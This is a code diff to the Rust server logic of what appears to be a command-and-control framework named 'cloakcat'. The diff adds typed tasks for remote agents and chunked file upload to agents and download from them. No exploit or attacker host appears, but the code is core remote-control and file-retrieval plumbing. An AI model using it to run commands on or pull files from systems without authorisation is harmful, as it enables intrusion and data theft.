@@ -1,15 +1,18 @@
 //! Domain logic layer — sits between HTTP handlers and DB.
 
-use base64::engine::general_purpose::STANDARD_NO_PAD as B64;
+use base64::engine::general_purpose::STANDARD as B64;
 use base64::Engine;
 use tokio::time::{Duration, Instant};
 use uuid::Uuid;
 
-use cloakcat_protocol::{verify_result, AgentView, Command, RegisterReq, ResultReq, ResultView};
+use cloakcat_protocol::{
+    verify_result, AgentView, Command, FileChunk, RegisterReq, ResultReq, ResultView, TaskType,
+    UploadTask,
+};
 
 use crate::db;
 use crate::error::ServerError;
-use crate::state::AppState;
+use crate::state::{AppState, DownloadBuffer, UploadBuffer};
 
 fn agent_view_from(a: db::AgentRecord) -> AgentView {
     AgentView {
@@ -114,8 +117,19 @@ pub async fn push_command(
     state: &AppState,
     agent_id: &str,
     command: &str,
+    task_type: TaskType,
 ) -> Result<(), ServerError> {
-    db::insert_command(&state.db, agent_id, command).await?;
+    // Encode task_type into the stored command string when not Shell.
+    let stored = match &task_type {
+        TaskType::Shell => command.to_string(),
+        tt => serde_json::to_string(&serde_json::json!({
+            "__tt": tt,
+            "__cmd": command,
+        }))
+        .map_err(|e| ServerError::Internal(e.into()))?,
+    };
+
+    db::insert_command(&state.db, agent_id, &stored).await?;
 
     if let Err(e) = db::insert_audit(
         &state.db,
@@ -123,7 +137,7 @@ pub async fn push_command(
         "TASK_CREATE",
         "agent",
         agent_id,
-        &serde_json::json!({ "command": command }),
+        &serde_json::json!({ "command": command, "task_type": task_type }),
     )
     .await
     {
@@ -133,7 +147,7 @@ pub async fn push_command(
     // Wake up any poll_command waiting for this agent
     state.get_notify(agent_id).await.notify_one();
 
-    println!("Command queued for {}: {}", agent_id, command);
+    println!("Command queued for {}: {:?} {:?}", agent_id, task_type, command);
     Ok(())
 }
 
@@ -172,19 +186,36 @@ pub async fn poll_command(
     }
 }
 
+fn decode_command(cmd_rec: crate::db::CommandRecord) -> Command {
+    // Try to decode structured task envelope: {"__tt": ..., "__cmd": ...}
+    if let Ok(v) = serde_json::from_str::<serde_json::Value>(&cmd_rec.command) {
+        if let (Some(tt_val), Some(cmd_str)) = (v.get("__tt"), v.get("__cmd").and_then(|c| c.as_str())) {
+            if let Ok(task_type) = serde_json::from_value::<TaskType>(tt_val.clone()) {
+                return Command {
+                    cmd_id: cmd_rec.id.to_string(),
+                    command: cmd_str.to_string(),
+                    task_type,
+                };
+            }
+        }
+    }
+    Command {
+        cmd_id: cmd_rec.id.to_string(),
+        command: cmd_rec.command,
+        task_type: TaskType::Shell,
+    }
+}
+
 async fn fetch_command(
     state: &AppState,
     agent_id: &str,
 ) -> Result<Option<Command>, ServerError> {
     match db::get_oldest_command_for_agent(&state.db, agent_id).await {
         Ok(Some(cmd_rec)) => {
-            let cmd = Command {
-                cmd_id: cmd_rec.id.to_string(),
-                command: cmd_rec.command,
-            };
+            let cmd = decode_command(cmd_rec);
             println!(
-                "[server] poll hit: agent={} -> dispatch cmd {}",
-                agent_id, cmd.cmd_id
+                "[server] poll hit: agent={} -> dispatch cmd {} ({:?})",
+                agent_id, cmd.cmd_id, cmd.task_type
             );
             Ok(Some(cmd))
         }
@@ -263,6 +294,123 @@ pub async fn query_results(
             ts_ms: r.created_at.timestamp_millis(),
         })
         .collect())
+}
+
+// ========== File Transfer ==========
+
+/// Store a CLI upload chunk. Returns `true` once all chunks are received and the
+/// Upload command has been queued to the agent.
+pub async fn receive_upload_chunk(
+    state: &AppState,
+    agent_id: &str,
+    transfer_id: &str,
+    path: &str,
+    seq: u32,
+    total: u32,
+    data_b64: &str,
+) -> Result<bool, ServerError> {
+    if total == 0 || total > 100 {
+        return Err(ServerError::BadRequest("total chunks out of range (1-100)".into()));
+    }
+    let bytes = B64
+        .decode(data_b64)
+        .map_err(|_| ServerError::BadRequest("invalid base64 data".into()))?;
+
+    let complete = {
+        let mut buffers = state.upload_buffers.lock().await;
+        let buf = buffers
+            .entry(transfer_id.to_string())
+            .or_insert_with(|| UploadBuffer {
+                chunks: vec![None; total as usize],
+            });
+        if (seq as usize) < buf.chunks.len() {
+            buf.chunks[seq as usize] = Some(bytes);
+        }
+        buf.chunks.iter().all(|c| c.is_some())
+    };
+
+    if complete {
+        let task_json = serde_json::to_string(&UploadTask {
+            transfer_id: transfer_id.to_string(),
+            path: path.to_string(),
+        })
+        .map_err(|e| ServerError::Internal(e.into()))?;
+        push_command(state, agent_id, &task_json, TaskType::Upload).await?;
+        println!("[upload] transfer={} complete ({} chunks) -> queued to {}", transfer_id, total, agent_id);
+    }
+
+    Ok(complete)
+}
+
+/// Return the assembled upload file bytes for an agent fetch.
+pub async fn get_upload_bytes(
+    state: &AppState,
+    transfer_id: &str,
+) -> Result<Vec<u8>, ServerError> {
+    let buffers = state.upload_buffers.lock().await;
+    let buf = buffers.get(transfer_id).ok_or(ServerError::NotFound)?;
+    if !buf.chunks.iter().all(|c| c.is_some()) {
+        return Err(ServerError::BadRequest("upload transfer not yet complete".into()));
+    }
+    let assembled: Vec<u8> = buf
+        .chunks
+        .iter()
+        .flat_map(|c| c.as_ref().unwrap().iter().copied())
+        .collect();
+    Ok(assembled)
+}
+
+/// Store an agent download chunk. Returns `true` once all chunks are received.
+pub async fn receive_download_chunk(
+    state: &AppState,
+    chunk: &FileChunk,
+) -> Result<bool, ServerError> {
+    if chunk.total == 0 || chunk.total > 100 {
+        return Err(ServerError::BadRequest("total chunks out of range (1-100)".into()));
+    }
+    let bytes = B64
+        .decode(&chunk.data)
+        .map_err(|_| ServerError::BadRequest("invalid base64 data".into()))?;
+
+    let complete = {
+        let mut buffers = state.download_buffers.lock().await;
+        let buf = buffers
+            .entry(chunk.transfer_id.clone())
+            .or_insert_with(|| DownloadBuffer {
+                chunks: vec![None; chunk.total as usize],
+                complete: false,
+            });
+        if (chunk.seq as usize) < buf.chunks.len() {
+            buf.chunks[chunk.seq as usize] = Some(bytes);
+        }
+        if buf.chunks.iter().all(|c| c.is_some()) {
+            buf.complete = true;
+        }
+        buf.complete
+    };
+
+    if complete {
+        println!("[download] transfer={} complete ({} chunks)", chunk.transfer_id, chunk.total);
+    }
+    Ok(complete)
+}
+
+/// Return assembled download file bytes if all chunks are received, else `None`.
+pub async fn get_download_bytes(
+    state: &AppState,
+    transfer_id: &str,
+) -> Result<Option<Vec<u8>>, ServerError> {
+    let buffers = state.download_buffers.lock().await;
+    let buf = buffers.get(transfer_id).ok_or(ServerError::NotFound)?;
+    if !buf.complete {
+        return Ok(None);
+    }
+    let assembled: Vec<u8> = buf
+        .chunks
+        .iter()
+        .flat_map(|c| c.as_ref().unwrap().iter().copied())
+        .collect();
+    Ok(Some(assembled))
 }
 
 // ========== Audit ==========
